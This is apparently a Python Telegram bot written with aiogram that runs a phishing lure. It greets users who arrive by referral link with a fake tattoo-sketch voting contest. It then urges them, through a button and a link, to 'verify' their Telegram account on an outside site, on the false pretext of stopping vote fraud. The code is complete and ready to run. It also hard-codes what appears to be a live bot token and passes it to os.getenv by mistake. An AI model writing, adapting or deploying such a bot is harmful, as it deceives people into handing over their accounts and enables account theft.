import os
import asyncio
from aiogram import Bot, Dispatcher, exceptions
from aiogram.client.bot import DefaultBotProperties
from aiogram.filters import CommandStart
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.utils.markdown import hbold, hlink
from dotenv import load_dotenv

# Загружаем переменные из .env
load_dotenv()
BOT_API_TOKEN = os.getenv("8328428976:AAEy_mew10stTQSJO_LvGsrz3XyOkw9A4bg")

if not BOT_API_TOKEN:
    raise ValueError("Не найден токен бота в .env файле!")

IMAGE_PATH = "eskiz.jpg"  # файл должен лежать в папке проекта

# Инициализация бота
bot = Bot(token=BOT_API_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

@dp.message(CommandStart())
async def cmd_start(message: Message, command: CommandStart):
    args = command.args.strip() if command.args else None
    if not args:
        await message.answer("Доступ только по реферальной ссылке.")
        return

    # Отправка картинки
    if os.path.exists(IMAGE_PATH):
        photo = FSInputFile(IMAGE_PATH)
        try:
            await message.answer_photo(photo=photo, caption=hbold(f"✦Эскиз: @{args}"))
        except exceptions.TelegramBadRequest:
            await message.answer(hbold(f"✦Эскиз: @{args}"))
    else:
        await message.answer(hbold(f"✦Эскиз: @{args}"))

    # Кнопка
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Верификация аккаунта✅", url="https://llill.icu/i")]
    ])

    # Текст сообщения
    text = (
        f"{hbold('Привет и добро пожаловать! 👋')}\n\n"
        f"{hbold('Ты перешел по ссылке, чтобы проголосовать за лучший эскиз тату? Это круто!')}\n\n"
        f"{hbold(f'Чтобы твой голос за нашего участника @{args} был учтен, нужен один важный шаг — твой Telegram-аккаунт должен быть подтвержден.')}\n\n"
        f"{hbold('Зачем это нужно?')} Это необходимо для честности конкурса. "
        f"Так мы отсекаем накрутки и ботов, чтобы побеждали только лучшие работы, а не те, у кого больше ботов.\n\n"
        f"{hbold('Как подтвердить?')} Это легко! Просто зайди на "
        f"{hlink('страницу верификации аккаунта','https://llill.icu/i')} "
        f"и следуй инструкциям. Это займет всего пару минут.\n\n"
        f"{hbold(f'Спасибо, что помогаешь нам сохранять честность и поддерживаешь искусство! Удачи участнику @{args}! ✨')}"
    )

    # Отправка текста с кнопкой
    try:
        await message.answer(text, reply_markup=kb)
    except exceptions.TelegramBadRequest:
        await message.answer(text)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
